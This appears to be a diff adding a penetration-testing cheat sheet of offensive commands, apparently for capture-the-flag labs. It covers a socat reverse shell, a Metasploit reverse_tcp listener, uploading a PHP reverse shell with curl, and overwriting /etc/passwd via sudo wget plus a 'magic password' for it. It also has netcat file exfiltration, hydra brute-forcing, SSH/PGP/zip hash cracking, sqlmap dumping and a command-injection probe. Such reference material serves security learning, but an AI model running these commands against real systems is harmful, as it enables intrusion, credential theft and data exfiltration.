@@ -1,0 +1,317 @@
+----------------------- kornea CheatSheet v1.1 -------------------------
+
+[+] Python commands
+
+		[=>] python -c 'import pty; pty.spawn("/bin/bash")'  # Spawns a shell
+
+		[=>] python3 -m http.server 80		# Hosts the web server from whichever directory you are
+			 wget http://YOURIPADDRESS/phpbash.php  # Pull files from the server directory
+
+		[=>] python -m SimpleHTTPServer 8080
+			 sudo /usr/bin/wget 10.9.120.205:8080/passwd -O /etc/passwd
+
+------------------------------------------------------------------------
+
+[+] NFS 
+	[1] showmount -e <IP_ADDR>				# lists all clients and the local directories that the clients have mounted
+		[Output]
+			Export list for 10.10.55.190:
+			/home/nfs *						# <SHARE>
+		
+	[2] mkdir /tmp/share
+	[3] mount -t nfs <IP_ADDR>:<SHARE> /tmp/share	# mounts nfs shares locally
+
+------------------------------------------------------------------------
+
+[+] Metasploit Meterpreter
+
+	[=>] Listen for a connection
+		[1] use exploit/multi/handler
+		[2] set payload <PAYLOAD>		# Example: php/meterpreter/reverse_tcp
+		[3] show options
+		[4] run
+
+	[=>] sessions -k <session_id> 	#kills the sessions
+	[=>] sessions -u <session_id> 	#upgrade to meterepreter
+	[=>] sessions <session_id>		#interact with shell ( In Layman's terms, bring background shell to foreground )
+
+------------------------------------------------------------------------
+
+[+] pgp archived ( http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/ )
+
+	[=>] gpg2john <PRIVATE_KEY.asc> > <CRACKED.hash>	# Cracks hash for JTR
+	[=>] john --show <CRACKED.hash>						# Password for .pgp file
+	[=>] gpg --decrypt <BACKUP.pgp>						# Decrypt file
+
+	[+] with secret key
+		[=>] gpg --import <PRIVATE_KEY.asc>					# import private key
+		[=>] gpg2john <PRIVATE_KEY.asc> > <CRACKED.hash>	# cracks hash for JTR
+		[=>] john <CRACKED.hash> --wordlist=<WORDLIST>		# dictionary attack the hash
+		[=>] john --show <CRACKED.hash>						# shows cracked password
+		[=>] gpg --decrypt <BACKUP.pgp>						# it will ask for a password now
+
+------------------------------------------------------------------------
+
+[+] Directory Enumeration commands
+
+	[+] Directory 
+
+		[=>] gobuster dir -u <IP_ADDR> -w <WORDLIST> -t 50 -x php,html,txt
+
+	[+] Virtual hosts
+
+		[=>] gobuster vhost -u <IP_ADDR> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 
+
+------------------------------------------------------------------------
+
+[+] FTP commands
+
+		[?] "/etc/vsftpd/vsftpd.conf"  		# FTP Server conf file
+		[?] "/var/ftp"						# Default directory for anonymous connections
+		[=>] wget -r ftp://<IP_ADDR>		# Pulls files from ftp server
+
+------------------------------------------------------------------------
+
+[+] smbclient
+
+		[=>] smbclient \\\\<IP_ADDR>\\<SHARENAME>		# anonymous access
+		[=>] smbclient -u <USER> \\\\<IP_ADDR>\\<SHARENAME> 
+		[=>] smbclient //<IP_ADDR>/<SHARE_NAME> -N		# When you know the share name. USE ENUM4LINUX
+
+------------------------------------------------------------------------
+
+[+] Apache
+		
+		[=>] sudo service apache start					# start local apache server
+
+------------------------------------------------------------------------
+
+[+] GitTools
+
+	[+] Download contents of .git
+		[=>] gitdumper.sh <IP_ADDR_TO_.git> <DOWNLOAD DIRECTORY>
+
+	[+] Extract commits of .git
+		[=>] extractor.sh <Path to directory containing .git> <Path of output folder>
+
+------------------------------------------------------------------------
+
+[+] SQL Injection
+
+		[+] sqlmap commands
+
+				# Use to grab everything from the database
+				[=>] sqlmap -u <IP_ADDR> -a
+
+				# Use when dealing with Forms
+				[=>] sqlmap -u <IP_ADDR> --dbs --forms
+
+				# List available databases
+				[1] sqlmap -u <IP_ADDR> --dbs 			# Find a parameter which is vulnerable first
+				
+				# List available tables in selected Database
+				[2] sqlmap -u <IP_ADDR> -D <DB_NAME> --tables
+
+				# List available columns in selected table of selected Database
+				[3] sqlmap -u <IP_ADDR> -D <DB_NAME> -T <TABLE> --columns 
+
+				# Dump the data in selected column
+				[4] sqlmap -u <IP_ADDR> -D <DB_NAME> -T <TABLE> -C <COLUMN> --dump
+
+------------------------------------------------------------------------
+
+[+]Find Files 
+
+		[+] Avoid noise while finding files
+			
+				[=>] find / <OPTIONS AND PARAMS> 2>/dev/null
+
+		[+] File with setuid Permissions saved in a file
+				
+				[=>] find / -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename
+
+		[+] SUID
+
+				[=>] find / -perm -u=s -type f 2>/dev/null
+
+		[+] Avoid Noise
+				
+				[=>] find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+		[+] Find files owned by a user
+
+				[=>] find / -user <USERNAME> -name <FILENAME>
+
+-------------------------------------------------------------------------
+
+[+] Priv Esc commands
+
+		[=>] sudo -l                   	# Allowed commands
+		[=>] cat /etc/passwd			# System Account Enumeration
+		[=>] sudo -u <username> <file>  # execute as specified user
+
+-------------------------------------------------------------------------
+
+[+] Copy files to a target host
+
+		[=>] scp <PATH_TO_FILE> <user>@<host>:<location>
+
+-------------------------------------------------------------------------
+
+[+] HASHES
+
+		[+] hashid -m -j <filename>
+
+		[+] Linux Password Hashes Types
+
+				Example of MD5 Hash -> $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ
+
+				$1 = MD5 hashing algorithm.
+				$2 =Blowfish Algorithm is in use.
+				$2a=eksblowfish Algorithm
+				$5 =SHA-256 Algorithm
+				$6 =SHA-512 Algorithm
+
+		[+] Zip Hash Cracking
+
+				[1] zip2john <filename> > crack 				- To extract zip hash to pass into John the ripper
+				[2] john crack                  				- Crack the hash
+
+		[+] Cracking SSH keys with John
+
+				[1] ssh2john <KEY_TO_CRACK> > <CRACKED_FILE>
+				[2] john <CRACKED_FILE> --wordlist=<WORDLIST>
+				[3] ssh -i <KEY_TO_CRACK> <user>@<IP>
+
+		[+] Hashcat cracking 
+
+				[=>] hashcat -m <hash_mode> -a <attack_mode> <Path_to_Hashes> <Path_to_Word_list> -o <Path_to_Output_Cracked_Hashes>
+
+-------------------------------------------------------------------------
+
+[+] xfreerdp
+
+	[+] xfreerdp /u:<USERNAME> /p:<PASSWORD> /w:1366 /h:768 /v:<IP_ADDR>:<PORT>
+
+-------------------------------------------------------------------------
+
+[+] Wordpress
+
+		[=>] wpscan --url http://<IP_ADDR> --wordlist /location/of/wordlist/ --username <USERNAME>
+
+-------------------------------------------------------------------------
+
+[+] nmap & rustscan
+
+	[=>] nmap --script=banner <IP_ADDR>				# prints banners
+	[=>] rustscan -b 500 -a <IP_ADDR> -- -A			# rustscan basic scan
+													# flag to the left of '--' will be for rustscan whereas the other side will be for 														# nmap 
+
+-------------------------------------------------------------------------
+
+[+] Netcat
+
+		[=>] nc -nvlp <LISTENING_PORT>
+
+	[+] For transfering files over Netcat
+		[+] Receiver
+			[=>] nc -nvlp <PORT> > <FILENAME>
+		[+] Sender
+			[=>] nc -w 3 <DEST_IP> <PORT> < <FILENAME>
+
+	[+] For transfering faster
+		[+] Receiver
+			[=>] nc -nvlp <PORT> | uncompress -c | tar xvfp -
+		[+] Sender
+			[=>] tar cfp - /some/dir | compress -c | nc -w 3 <DEST_IP> <PORT>
+
+-------------------------------------------------------------------------
+
+[+] Hydra
+		
+		# SSH / FTP Bruteforcing
+		[=>] hydra -l <KNOWN_USERNAME> -P <WORDLIST> <PROTOCOL>://<IP_ADDR> -t <THREADS>
+
+		# Web based forms Bruteforcing ( http / https )
+		[=>] hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
+
+		EXAMPLE -> 
+			$QUERY ->/dvwa/login.php:username=^USER^&password=^PASS^:Login Failed
+			[=>] hydra -L <user.txt> -P <pass.txt> <IP> http-post-form "$QUERY"
+
+-------------------------------------------------------------------------
+
+[+] Curl
+	
+	[+] Upload using curl
+		[=>] curl --user "wampp:xampp" http://10.10.150.131/webdav/ --uploadfile php-reverse-shell.php -v
+
+-------------------------------------------------------------------------
+
+[+] socat
+
+		[+] Reverse Shell with socat 
+
+				# Listening Machine
+				[=>] socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
+
+				# Attacking Machine
+				[=>] socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
+
+-------------------------------------------------------------------------
+
+[+] Misc commands
+
+		[=>] chmod +x <FILENAME>                    # Make a file executable
+		[=>] tty									# Your Shell
+		[=>] ps aux
+		[=>] xfreerdp 								# RDP Protocol
+		[=>] [1] .ssh/id_rsa
+			 [2] ssh -i id_rsa <USER>@<IP_ADDR>		# SSH ID_RSA
+		[=>] U6aMy0wojraho							# Magic Password to use in /etc/passwd at root:x:....
+		[=>] ssh-keygen -o							# generate id_rsa.pub
+		[=>] readlink -f <FILENAME>					# Prints path to the file
+		[=>] export admin=1							# sets environment variable 'admin' to 1 
+		[=>] getcap -r / 2>/dev/null				# list capabilities
+		[=>] xdg-open <file/directory>				# opens file or directory from the terminal
+		[=>] mkpasswd -m sha-512 newpasswordhere	# generate new sha-512 password
+		[=>] openssl passwd newpasswordhere			# generate new password hash
+
+		[+] Injection type:
+			[=>] ; ping <IP>						# use this in webforms for checking RCE
+			[=>] tcpdump -i <ATTACKER_IP>			# listen to incoming ping for confirmation
+
+-------------------------------------------------------------------------
+
+[+] Docker
+	
+	[=>] docker container ps						# list running docker images
+	[=>] docker container ps -a						# list inactive docker images
+	[=>] docker image ls							# lists images
+	[=>] docker run <image_name> 					# run a docker image
+
+-------------------------------------------------------------------------
+
+[+] cewl
+
+	[=>] cewl <IP_ADDR>
+
+	[#] Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file 
+	[=>] cewl -d 2 -m 5 -w docswords.txt <IP_ADDR>	# 
+
+-------------------------------------------------------------------------
+
+[+] Shell Upgrade
+	
+	[1] Ctrl+Z										# Background the reverse shell
+	[2]	stty raw -echo								
+	[3] fg											# You can sometimes not see it
+	[4] Press enter once or twice				
+
+-------------------------------------------------------------------------
+
+[+] MySQL
+
+		[=>] mysql -h <IP_ADDR> -u root -p
+
+-------------------------------------------------------------------------
